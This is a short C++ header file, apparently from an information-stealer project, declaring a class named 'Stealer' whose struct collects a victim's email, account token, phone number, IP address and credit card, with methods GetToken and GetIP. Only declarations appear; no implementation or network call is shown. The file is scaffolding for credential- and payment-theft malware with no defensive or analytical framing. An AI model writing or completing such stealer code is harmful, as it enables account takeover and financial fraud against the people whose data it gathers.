#pragma once
#define _WINSOCKAPI_ 
#include <iostream>
#include <Windows.h>
#include <Lmcons.h>
#include <string>
#include <regex>
#include <fstream>
#include <vector>
#include <sstream>



class Stealer
{
public:
	struct AccountInformation {
		std::string EMail,
			Token,
			PhoneNumber,
			IP,
			CreditCard;
	}info;
	void GetToken();
	void GetIP();
};

